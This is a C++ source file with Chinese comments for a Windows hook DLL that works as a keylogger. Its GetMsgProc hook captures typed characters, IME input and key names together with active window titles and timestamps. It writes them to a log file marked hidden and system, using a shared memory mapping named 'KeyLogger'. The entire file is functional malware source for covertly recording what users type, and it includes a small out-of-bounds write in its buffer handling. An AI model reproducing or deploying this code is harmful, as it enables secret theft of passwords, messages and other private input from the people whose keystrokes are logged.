// HookDll.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <Windows.h>
#pragma comment(lib, "Imm32.lib")

#define KEY_BUF_SIZE	0x10

extern "C" __declspec(dllexport) 
LRESULT CALLBACK GetMsgProc(
	int nCode, 
	WPARAM wParam, 
	LPARAM lParam
);


typedef	struct
{
	HWND	hActWnd;						//current actived window
	char	strRecordFile[MAX_PATH];
	char	keybuffer[KEY_BUF_SIZE];		//log buffer
	DWORD	usedlen;						//
	DWORD	LastMsgTime;
}TShared;



TShared* pShareData = NULL;
HANDLE	 hMapObj    = INVALID_HANDLE_VALUE;
LPVOID	 lpMemBase  = NULL;

void WriteToFile(const char* lpBuffer,int length)
{
	HANDLE	hFile = CreateFile(
		pShareData->strRecordFile, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE,
		NULL, 
		OPEN_ALWAYS, 
		FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN,
		NULL
	);
	
	if (hFile != INVALID_HANDLE_VALUE) 
	{
		DWORD dwBytesWrite = 0;
		DWORD dwSize = GetFileSize(hFile, NULL);
		
		//大于 50 MB 直接覆盖了...
		if (dwSize < 1024 * 1024 * 50)
			SetFilePointer(hFile, 0, 0, FILE_END);
		
		WriteFile(hFile, lpBuffer, length, &dwBytesWrite, NULL);
		CloseHandle(hFile);
	}	
}

void SaveLog(const char* buffer, int len,bool flushImmediately) {
	
	//检查ActiveWnd是否改变
	HWND hWnd = GetActiveWindow();
	char szCaption[0x800];
	char strSaveString[0x800];
	
	SYSTEMTIME	SysTime;

	if (hWnd != pShareData->hActWnd)
	{
		pShareData->hActWnd = hWnd;
		GetWindowText(pShareData->hActWnd, szCaption, sizeof(szCaption));
		
		GetLocalTime(&SysTime);
		wsprintfA(
			strSaveString,
			"\r\n\r\n[%02d/%02d/%d %02d:%02d:%02d] (%s)\r\n",
			SysTime.wMonth, 
			SysTime.wDay, 
			SysTime.wYear,
			SysTime.wHour, 
			SysTime.wMinute, 
			SysTime.wSecond,
			szCaption
		);
		//flush buffer when active window changed.
		WriteToFile(pShareData->keybuffer, pShareData->usedlen);
		pShareData->usedlen = 0;

		//
		WriteToFile(strSaveString,strlen(strSaveString));
	}

	if (flushImmediately) 
	{
		return WriteToFile(buffer, len);
	}

	//buffer is full..
	if (len >= KEY_BUF_SIZE) 
	{
		return WriteToFile(buffer, len);
	}
	
	if ((pShareData->usedlen + len) >= KEY_BUF_SIZE)
	{
		WriteToFile(pShareData->keybuffer, pShareData->usedlen);
		pShareData->usedlen = 0;
	}
	//Append Data to buffer;
	for (int i = 0; i < len; i++)
	{
		(pShareData->keybuffer + pShareData->usedlen)[i] = buffer[i];
	}

	pShareData->usedlen += len;
}


LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSG	*	pMsg;
	char	strChar[2];
	char	KeyName[20];
	LRESULT result;
	
	result = CallNextHookEx(NULL, nCode, wParam, lParam);
	pMsg = (MSG*)(lParam);

	//映射失败了....
	if (pShareData == NULL)
	{
		return result;
	}
	//不用处理..
	if (nCode != HC_ACTION)
	{
		return result;
	} 

	if( (pMsg->message != WM_IME_COMPOSITION
		&& pMsg->message != WM_CHAR) ||
		(pShareData->LastMsgTime == pMsg->time))
	{
		return result;
	}

	//update time...
	pShareData->LastMsgTime = pMsg->time;

	if ((pMsg->message == WM_IME_COMPOSITION) &&
		(pMsg->lParam & GCS_RESULTSTR))
	{
		HWND	hWnd = pMsg->hwnd;
		HIMC	hImc = ImmGetContext(hWnd);
		LONG	strLen = ImmGetCompositionStringA(hImc, GCS_RESULTSTR, NULL, 0);
		if (strLen > 0) 
		{
			char* buff = (char*)HeapAlloc(GetProcessHeap(), HEAP_NO_SERIALIZE, strLen);

			if (buff)
			{
				buff[strLen] = 0;
				strLen = ImmGetCompositionStringA(hImc, GCS_RESULTSTR, buff, strLen);
				ImmReleaseContext(hWnd, hImc);
				SaveLog(buff, strLen, false);
				
				HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, buff);
			}	
		}
	}
	else if (pMsg->message == WM_CHAR)
	{
		if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
		{
			strChar[0] = pMsg->wParam;
			strChar[1] = '\0';
			SaveLog(strChar,1, NULL);
		}
		else if (pMsg->wParam == VK_RETURN)
		{
			SaveLog("[Enter]",7, NULL);
		}
		else
		{
			memset(KeyName, 0, sizeof(KeyName));
			if (GetKeyNameText(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
			{
				KeyName[0] = '[';
				lstrcatA(KeyName, "]");
				SaveLog(KeyName,strlen(KeyName),NULL);
			}
		}
	}
	return result;
}

#pragma comment(linker,"/entry:MyEntry")


void InitLog()
{
	//映射内存...
	/*
		如果 FileHandle 不为-1, 那么 Max指定的是文件的大小
		否则的话 是匿名映射, Max指定内存的大小.
	*/
	hMapObj = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_EXECUTE_READWRITE,
		0,
		0x1000,
		"KeyLogger");
	
	if (hMapObj == NULL)
		return;
	
	lpMemBase = (char*)MapViewOfFile(
		hMapObj,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		0x1000);

	if (lpMemBase == NULL)
		return;

	pShareData = (TShared*)lpMemBase;
}


void CleanLog()
{
	if (lpMemBase)
	{
		UnmapViewOfFile(lpMemBase);
		lpMemBase = NULL;
	}
	if (hMapObj != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hMapObj);
		hMapObj = INVALID_HANDLE_VALUE;
	}
}

BOOL __stdcall MyEntry(
	HINSTANCE hinstDLL,  // handle to the DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpvReserved   // reserved
)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		InitLog();
		break;
	case DLL_PROCESS_DETACH:
		CleanLog();
		break;
	default:
		break;
	}
	return TRUE;
}
